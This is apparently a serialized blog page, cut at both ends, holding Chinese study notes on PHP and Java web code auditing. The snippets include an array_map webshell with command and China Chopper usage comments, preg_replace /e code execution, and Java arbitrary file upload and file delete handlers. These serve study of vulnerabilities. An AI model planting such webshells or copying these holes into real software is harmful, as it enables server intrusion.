class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DiskFileItemFactory@MultipartConfigMultipartFileFile</span><br><span class=\"line\">Upload</span><br><span class=\"line\">InputStream</span><br><span class=\"line\">OutputStream</span><br><span class=\"line\">write</span><br><span class=\"line\">fileName</span><br><span class=\"line\">filePath</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"8-servlet文件上传函数\"><a href=\"#8-servlet文件上传函数\" class=\"headerlink\" title=\"8.servlet文件上传函数\"></a>8.servlet文件上传函数</h3><blockquote>\n<p>servlet3之前<br>使用commons-fileupload、commons-io这两个jar包来处理文件上传</p>\n<p>servlet3之后<br>使用request.getParts()获取上传文件</p>\n</blockquote>\n<h3 id=\"9-java任意文件上传\"><a href=\"#9-java任意文件上传\" class=\"headerlink\" title=\"9.java任意文件上传\"></a>9.java任意文件上传</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException &#123;</span><br><span class=\"line\">    Part part = request.getPart(&quot;fileName&quot;);</span><br><span class=\"line\">    if(part == null) &#123;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();</span><br><span class=\"line\">    part.write(filename);</span><br><span class=\"line\">    part.delete();</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-任意文件删除\"><a href=\"#10-任意文件删除\" class=\"headerlink\" title=\"10.任意文件删除\"></a>10.任意文件删除</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class=\"line\">File file = new File(filename);</span><br><span class=\"line\">if(file != null &amp;&amp; file.exists() &amp;&amp; file.delete()) &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete success&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete failed&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"PHP-JAVA复习指南\"><a href=\"#PHP-JAVA复习指南\" class=\"headerlink\" title=\"PHP &#x2F; JAVA复习指南\"></a>PHP &#x2F; JAVA复习指南</h1><h2 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h2><h3 id=\"1-php-命令执行函数以及函数应用场景\"><a href=\"#1-php-命令执行函数以及函数应用场景\" class=\"headerlink\" title=\"1.php 命令执行函数以及函数应用场景\"></a>1.php 命令执行函数以及函数应用场景</h3><ul>\n<li><code>system()</code> 将字符串作为OS命令执行，自带输出功能。</li>\n<li><code>passthru()</code>将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li>\n<li><code>exec()</code>将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。</li>\n<li><code>shell_exec</code> 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容</li>\n<li><code>popen()/proc_open()</code>该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。需要用**<u>fread</u>**来读</li>\n<li><code>反引号 </code> [&#96;&#96;]反引号里面的代码也会被当作OS命令来执行</li>\n</ul>\n<h3 id=\"2-php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php-ini中进行怎样的配置？\"><a href=\"#2-php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php-ini中进行怎样的配置？\" class=\"headerlink\" title=\"2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？\"></a>2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？</h3><p>php封装协议又称为伪协议，主要分为以下几种：</p>\n<ul>\n<li><p><code>file://</code>  file:&#x2F;&#x2F; 用于访问本地文件系统它在双off的情况下也可以正常使用；allow_url_fopen ：off&#x2F;on allow_url_include：off&#x2F;on</p>\n</li>\n<li><p><code>php://filter</code> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了在双off的情况下也可以正常使用；</p>\n</li>\n<li><p><code>php://input</code> 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据allow_url_fopen ：off&#x2F;on</p>\n<p>allow_url_include：on</p>\n</li>\n<li><p><code>zip:// compress.bzip:// compress.zlib://</code>均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。双off也能用</p>\n</li>\n<li><p><code>data://</code> 数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。必须要双on才可以</p>\n</li>\n<li><p><code>phar:/</code>&#x2F; 反序列化有时会用到 与zip协议不同的是zip协议为绝对路径，而phar协议为相对路径</p>\n</li>\n</ul>\n<h3 id=\"3-代码执行函数\"><a href=\"#3-代码执行函数\" class=\"headerlink\" title=\"3.代码执行函数\"></a>3.代码执行函数</h3><ul>\n<li><p><code>preg_replace()</code> 在php 5.6及之前的版本，当第一个参数在 &#x2F;e 的修饰下，并且 magic_quotes_gpc&#x3D;Off 时，函数的第二个参数会被当做php代码执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&#x27; . $_GET[&#x27;reg&#x27;], &#x27;\\\\1&#x27; ,&#x27;&lt;php&gt;phpinfo()&lt;php&gt;&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/anything/e&#x27;, $_GET[&#x27;test&#x27;], &#x27;anything_test&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&lt;\\/php&gt;/e&#x27;, &#x27;\\\\1&#x27;, $_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>array_map()</code> 第一个参数是回调函数，第二参数是函数的参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $func=$_GET[&#x27;func&#x27;];</span><br><span class=\"line\">    $cmd=$_POST[&#x27;cmd&#x27;];</span><br><span class=\"line\">    $array[0]=$cmd;</span><br><span class=\"line\">    $new_array=array_map($func,$array);</span><br><span class=\"line\">    echo $new_array;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//    命令执行http://localhost/123.php?func=system   cmd=whoami</span><br><span class=\"line\"> //   菜刀连接http://localhost/123.php?func=assert   密码：cmd</span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><code>assert()</code> 判断一个表达式是否成立，能够把字符组成的字符串，当作代码执行。</p>\n<blockquote>\n<p>assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾（特别注意），有时加上分号不会显示结</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"4-php-中常见的文件读取-写入函数\"><a href=\"#4-php-中常见的文件读取-写入函数\" class=\"headerlink\" title=\"4.php 中常见的文件读取&#x2F;写入函数\"></a>4.php 中常见的文件读取&#x2F;写入函数</h3><p>共有9个文件读取函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents   // *</span><br><span class=\"line\">fread</span><br><span class=\"line\">fgets</span><br><span class=\"line\">fgetss</span><br><span class=\"line\">file</span><br><span class=\"line\">parse_ini_file</span><br><span class=\"line\">readfile    // *</span><br><span class=\"line\">highlight_file  // *</span><br><span class=\"line\">show_source // *</span><br></pre></td></tr></table></figure>\n\n<p>使用方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file_get_contents</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file_get_contents&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fread</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fread&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>,<span class=\"number\">1024</span>);     <span class=\"comment\">// 参数为 resource 类型</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgets</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgets&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);      </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgets</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">// 过滤掉了 HTML 和 PHP 标签</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgetss</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgetss&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);     </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgetss</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">// 过滤掉了 HTML 和 PHP 标签</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// readfile</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;readfile&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">readfile</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);      <span class=\"comment\">// 看到不仅输出了所有内容，而且还输出了总共长度</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>));      <span class=\"comment\">// 读取结果为数组，所以需要用 print_r 或 var_dump </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// parse_ini_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;parse_ini_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">parse_ini_file</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);        <span class=\"comment\">// 只能读取 ini 配置文件</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// show_source</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;show_source&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// highlight_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;highlight_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在PHP中使用 fweite() 和file_put_contents()函数向文件中写入数据。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"5-php-文件包含方法以及区别\"><a href=\"#5-php-文件包含方法以及区别\" class=\"headerlink\" title=\"5.php 文件包含方法以及区别\"></a>5.php 文件包含方法以及区别</h3><ul>\n<li><p><code>include</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php include &#x27;test.php&#x27;;?&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>include_once</code>  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题</p>\n</li>\n<li><p><code>require</code> 与include方法基本一样</p>\n</li>\n<li><p><code>require_once</code>   require_once 语句时会先检查要包含的文件是不是已经在该程序中的其他地方被包含过，如果有，则不会再次重复包含该文件</p>\n</li>\n</ul>\n<p>区别</p>\n<blockquote>\n<p>1、include如果碰到错误，会给出提示，并继续向下执行；而require会终止程序执行。2、require_once和include_once中如果包含的文件已经被包含过，就不会再次包含，但include和require会。</p>\n</blockquote>\n<h3 id=\"6-php反序列化漏洞涉及函数\"><a href=\"#6-php反序列化漏洞涉及函数\" class=\"headerlink\" title=\"6.php反序列化漏洞涉及函数\"></a>6.php反序列化漏洞涉及函数</h3><ul>\n<li><p><code>serialize()</code>  序列化：把对象转化为二进制的字符串</p>\n</li>\n<li><p><code>unserialize()</code> 反序列化：把对象转化的二进制字符串再转化为对象</p>\n</li>\n<li><p>魔术方法 可能在某些情况下自动调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.__construct()，类的构造函数</span><br><span class=\"line\"></span><br><span class=\"line\">2.__destruct()，类的析构函数</span><br><span class=\"line\"></span><br><span class=\"line\">3.__call()，在对象中调用一个不可访问方法时调用</span><br><span class=\"line\"></span><br><span class=\"line\">4.__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class=\"line\"></span><br><span class=\"line\">5.__get()，获得一个类的成员变量时调用</span><br><span class=\"line\"></span><br><span class=\"line\">6.__set()，设置一个类的成员变量时调用</span><br><span class=\"line\"></span><br><span class=\"line\">7.__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class=\"line\"></span><br><span class=\"line\">8.__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class=\"line\"></span><br><span class=\"line\">9.__sleep()，执行serialize()时，先会调用这个函数</span><br><span class=\"line\"></span><br><span class=\"line\">10.__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class=\"line\"></span><br><span class=\"line\">11.__toString()，类被当成字符串时的回应方法</span><br><span class=\"line\"></span><br><span class=\"line\">12.__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class=\"line\"></span><br><span class=\"line\">13.__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class=\"line\"></span><br><span class=\"line\">14.__clone()，当对象复制完成时调用</span><br><span class=\"line\"></span><br><span class=\"line\">15.__autoload()，尝试加载未定义的类</span><br><span class=\"line\"></span><br><span class=\"line\">16.__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"7-php-常见数组及引用\"><a href=\"#7-php-常见数组及引用\" class=\"headerlink\" title=\"7.php 常见数组及引用\"></a>7.php 常见数组及引用</h3><ul>\n<li><p><code>$_GET</code> 预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。</p>\n<p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制</p>\n</li>\n<li><p><code>$POST</code>预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。</p>\n<p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p>\n</li>\n<li><p><code>$_REQUEST</code> 既可以接收$_GET又可以接收$POST的值</p>\n</li>\n<li><p><code>$_FILES</code> 上传文件信息</p>\n</li>\n<li><p><code>$_COOKIE</code>用于获取 cookie 的值。</p>\n</li>\n<li><p><code>$SESSION</code>读取Session变量信息</p>\n</li>\n</ul>\n<h2 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h2><h3 id=\"1-Web服务器\"><a href=\"#1-Web服务器\" class=\"headerlink\" title=\"1.Web服务器\"></a>1.Web服务器</h3><p>常见的java EE web服务器</p>\n<p><strong>tomcat   jetty  resin</strong></p>\n<p>专业级java EE web 服务器</p>\n<p><strong>JBOSS   GlassFish   Weblogic   Webshpere</strong></p>\n<p>常见漏洞</p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/399939177\" >https://zhuanlan.zhihu.com/p/399939177<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"2-tomcat目录结构与功能\"><a href=\"#2-tomcat目录结构与功能\" class=\"headerlink\" title=\"2.tomcat目录结构与功能\"></a>2.tomcat目录结构与功能</h3><ul>\n<li><code>bin</code>:目录里主要是有启动和关闭应用服务器的bat批处理命令；</li>\n<li><code>conf</code>:这个目录里主要是支持配置Tomcat的文件。</li>\n<li><code>lib</code>:这里面是支持Tomcat启动的jar包，当然也可以放你自己项目需要的jar包。</li>\n<li><code>temp</code>:Tomcat运行过程中产生的临时文件。</li>\n<li><code>webapps</code>:这里就是你的项目了，你的项目可以是以文件或者jar包的方式存放在这个目录里。</li>\n<li><code>work</code>：work目录用来存放tomcat在运行时的编译后文件，例如JSP编译后的文件。</li>\n</ul>\n<h3 id=\"3-tomcat中web-xml-与-tomcat-user-xml-的作用\"><a href=\"#3-tomcat中web-xml-与-tomcat-user-xml-的作用\" class=\"headerlink\" title=\"3.tomcat中web.xml 与 tomcat_user.xml 的作用\"></a>3.tomcat中web.xml 与 tomcat_user.xml 的作用</h3><p><code>web.xml</code><br>Tomcat可以让用户通过将缺省的web.xml放入conf目录中来定义所有关系环境的web.xml的缺省值.建立一个新的关系环境时,Tomcat使用缺省的web.xml文件作为基本设置和应用项目特定的web.xml(放在应用项目的WEB-INF&#x2F;web.xml文件)来覆盖这些缺省值.是配置整个tomcat的jsp和servlet工作中的一些情况,比如我们配置list来不让我们输入一个目录的时候显示出那个目录下的jsp文件,而是显示404错误.还有在一些安全方面也可以做配置.</p>\n<p><code>tomcat-users.xml</code><br> 配置tomcat的用户了信息.可以到tomcat的开始页<a href=\"http://localhost:8080中点tomcat\">http://localhost:8080中点tomcat</a> manager就会提示你要用户名和密码了,这里的用户名和密码就可以在这个xml中配置的</p>\n<h3 id=\"4-什么是jsp\"><a href=\"#4-什么是jsp\" class=\"headerlink\" title=\"4.什么是jsp\"></a>4.什么是jsp</h3><blockquote>\n<p>JSP全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头以%&gt;结束。</p>\n<p>JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>\n<p>JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>\n<p>JSP标签有多种功能，比如访问数据库、记录用户选择信息、访问JavaBeans组件等，还可以在不同的网页中传递控制信息和共享信息。</p>\n</blockquote>\n<h3 id=\"5-java-代码审计xss\"><a href=\"#5-java-代码审计xss\" class=\"headerlink\" title=\"5.java 代码审计xss\"></a>5.java 代码审计xss</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 